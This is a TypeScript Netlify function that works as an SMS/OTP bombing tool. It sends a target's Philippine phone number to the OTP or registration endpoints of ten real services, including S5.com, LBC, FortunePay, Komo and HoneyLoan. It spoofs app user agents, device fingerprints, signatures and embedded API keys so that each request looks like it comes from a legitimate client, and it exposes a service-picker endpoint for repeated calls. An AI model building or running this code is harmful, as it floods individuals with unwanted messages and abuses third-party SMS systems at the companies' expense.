import { Handler } from "@netlify/functions";
import axios from "axios";

const randomString = (length: number) => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
};

const services = [
  {
    name: "S5.com",
    handler: async (num: string) => {
      try {
        const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
        const boundary = "----WebKitFormBoundary" + randomString(16);
        const data = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${formatted}\r\n--${boundary}--\r\n`;
        const res = await axios.post("https://api.s5.com/player/api/v1/otp/request", data, {
          headers: {
            'authority': 'api.s5.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en',
            'access-control-allow-origin': '*',
            'cache-control': 'no-cache',
            'content-type': `multipart/form-data; boundary=${boundary}`,
            'origin': 'https://www.s5.com',
            'pragma': 'no-cache',
            'referer': 'https://www.s5.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-api-type': 'external',
            'x-locale': 'en',
            'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
            'x-timezone-offset': '480'
          },
          timeout: 10000,
        });
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "Xpress PH",
    handler: async (num: string) => {
      try {
        const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
        const res = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
          "FirstName": "toshi",
          "LastName": "premium",
          "Email": `toshi${Date.now()}@gmail.com`,
          "Phone": formatted,
          "Password": "ToshiPass123",
          "ConfirmPassword": "ToshiPass123",
          "ImageUrl": "",
          "RoleIds": [4],
          "Area": "manila",
          "City": "manila",
          "PostalCode": "1000",
          "Street": "toshi_street",
          "ReferralCode": "",
          "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
          "FingerprintRequestId": "1757149666261.Rr1VvG",
        }, {
          headers: {
            "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart",
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "conversationid": "42d64cfe-330f-4876-aed2-5a3b1547e2ce",
            "Cookie": "ApplicationGatewayAffinityCORS=9af1ffd531ed95805ec09cbdf3793dd6; ApplicationGatewayAffinity=9af1ffd531ed95805ec09cbdf3793dd6",
          },
          timeout: 10000
        });
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "Abenson",
    handler: async (num: string) => {
      try {
        const res = await axios.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', 
          `contact_no=${num}&login_token=undefined`, 
          {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
              'Accept': 'application/json',
              'Content-Type': 'application/x-www-form-urlencoded',
              'x-requested-with': 'com.abensonmembership.cloone',
              'origin': 'https://localhost',
              'referer': 'https://localhost/'
            },
            timeout: 10000
          }
        );
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "Excellente Lending",
    handler: async (num: string) => {
      try {
        const coordinates = [
          { lat: '14.5995', long: '120.9842' },
          { lat: '14.6760', long: '121.0437' },
          { lat: '14.8648', long: '121.0418' }
        ];
        const coord = coordinates[Math.floor(Math.random() * coordinates.length)];
        const res = await axios.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
          "domain": num,
          "cat": "login",
          "previous": false,
          "financial": "efe35521e51f924efcad5d61d61072a9"
        }, {
          headers: {
            'User-Agent': 'okhttp/4.12.0',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json; charset=utf-8',
            'x-version': '1.1.2',
            'x-package-name': 'com.support.excellenteralending',
            'x-adid': 'efe35521e51f924efcad5d61d61072a9',
            'x-latitude': coord.lat,
            'x-longitude': coord.long
          },
          timeout: 10000
        });
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "FortunePay",
    handler: async (num: string) => {
      try {
        const cleanNum = num.startsWith("0") ? num.slice(1) : num;
        const res = await axios.post('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register', {
          "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
          "deviceType": 'GOOGLE_PLAY',
          "companyId": '4bf735e97269421a80b82359e7dc2288',
          "dialCode": '+63',
          "phoneNumber": cleanNum
        }, {
          headers: {
            'User-Agent': 'Dart/3.6 (dart:io)',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'app-type': 'GOOGLE_PLAY',
            'authorization': 'Bearer',
            'app-version': '4.3.5',
            'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
            'timestamp': Date.now().toString(),
            'nonce': `${randomString(10)}-${Date.now()}`
          },
          timeout: 10000
        });
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "WeMove",
    handler: async (num: string) => {
      try {
        const cleanNum = num.startsWith("0") ? num.slice(1) : num;
        const res = await axios.post('https://api.wemove.com.ph/auth/users', {
          "phone_country": '+63',
          "phone_no": cleanNum
        }, {
          headers: {
            'User-Agent': 'okhttp/4.9.3',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'xuid_type': 'user',
            'source': 'customer',
            'authorization': 'Bearer'
          },
          timeout: 10000
        });
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "LBC",
    handler: async (num: string) => {
      try {
        const cleanNum = num.startsWith("0") ? num.slice(1) : num;
        const res = await axios.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', 
          `verification_type=mobile&client_email=${randomString(8)}@gmail.com&client_contact_code=%2B63&client_contact_no=${cleanNum}&app_log_uid=${randomString(16)}&app_platform=Android&device_name=rosemary_p_global&device_os=Android15&device_brand=Xiaomi&app_version=3.0.67&app_framework=lbc_app&app_environment=production&app_hash=${randomString(32)}`,
          {
            headers: {
              'User-Agent': 'Dart/2.19 (dart:io)',
              'Accept-Encoding': 'gzip',
              'Content-Type': 'application/x-www-form-urlencoded',
              'api': 'LBC',
              'token': 'CONNECT'
            },
            timeout: 10000
          }
        );
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "Pickup Coffee",
    handler: async (num: string) => {
      try {
        const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
        const res = await axios.post('https://production.api.pickup-coffee.net/v2/customers/login', {
          "mobile_number": formatted,
          "login_method": 'mobile_number'
        }, {
          headers: {
            'User-Agent': 'okhttp/4.12.0',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'x-env': 'Production',
            'x-app-version': '2.7.0'
          },
          timeout: 10000
        });
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "HoneyLoan",
    handler: async (num: string) => {
      try {
        const res = await axios.post('https://api.honeyloan.ph/api/client/registration/step-one', {
          "phone": num,
          "is_rights_block_accepted": 1
        }, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2207117BPG Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.143 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'origin': 'https://honeyloan.ph',
            'referer': 'https://honeyloan.ph/',
            'x-requested-with': 'com.startupcalculator.caf'
          },
          timeout: 10000
        });
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  },
  {
    name: "Komo",
    handler: async (num: string) => {
      try {
        const res = await axios.post('https://api.komo.ph/api/otp/v5/generate', {
          "mobile": num,
          "transactionType": 6
        }, {
          headers: {
            'Connection': 'close',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
            'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
          },
          timeout: 10000
        });
        return res.status;
      } catch (error: any) {
        return error.response?.status || 500;
      }
    },
  }
];

export const handler: Handler = async (event) => {
  if (event.httpMethod === "GET" && event.path.endsWith("/services")) {
    return {
      statusCode: 200,
      body: JSON.stringify(services.map(s => s.name)),
    };
  }

  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  try {
    const { number, serviceIndex } = JSON.parse(event.body || "{}");
    const idx = parseInt(serviceIndex);
    const service = services[idx];

    if (!service) {
      return { statusCode: 400, body: JSON.stringify({ error: `Invalid service index: ${serviceIndex}` }) };
    }

    const status = await service.handler(number);
    return {
      statusCode: 200,
      body: JSON.stringify({ name: service.name, status: "SUCCESS", code: status }),
    };
  } catch (error: any) {
    return {
      statusCode: 200, // Return 200 so the frontend can handle the "FAILED" status in the JSON
      body: JSON.stringify({ status: "FAILED", error: error.message }),
    };
  }
};
